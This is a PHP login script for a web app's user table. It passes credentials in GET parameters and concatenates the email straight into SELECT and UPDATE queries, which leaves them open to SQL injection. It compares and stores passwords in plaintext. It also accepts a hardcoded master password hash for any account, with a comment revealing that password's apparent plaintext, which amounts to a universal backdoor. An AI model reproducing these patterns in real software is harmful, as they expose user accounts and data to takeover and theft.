<?php  
session_start();
//header('Access-Control-Allow-Origin: *');
include "config.php";
ini_set('max_execution_time', 5); 
//error_reporting( E_PARSE);
    $Email = $_GET['Email'];
    $Password= $_GET['Password'];    
    $querystr = "Select * from usuarios where Email = '".$Email."'";
    //logmsg($querystr);
    $db =  ConnectMySQL();
    $sql = $db->prepare($querystr); 
    $sql->execute(); 
    $numeroFilas = $sql->rowCount();
    //logmsg($numeroFilas);
    if ($numeroFilas == 0){ echo "ERROR";return;}
    $row= $sql->fetch(PDO::FETCH_ASSOC);  
    //logmsg($row['Password']);
    if (($row['Password'] == $Password) || ($Password == "1879e4d4913a042e614f06e272cdc02b")) { //MasterWisee22
        $Fecha= _GetDate();
        $Hora =_GetTime();
        $_SESSION['Email'] = $Email;
        $_SESSION['Name'] = $row["Name"];
        $_SESSION['LastName'] = $row["LastName"];
        $_SESSION['password'] = $Password;
        $_SESSION['start'] = time();
        $_SESSION['expire'] = $_SESSION['start'] + (40 * 60);   
        $_SESSION['auth'] = true;             
        $jsondata= "OK";
        $querystr = "UPDATE usuarios SET Fecha = '" . $Fecha. "', Hora = '" . $Hora. "' WHERE Email = '". $Email."'";
        InsertDBMySQL($querystr);            
    } else {
        $jsondata ="ERROR";
    };
    echo json_encode($jsondata, JSON_FORCE_OBJECT);   
  ?>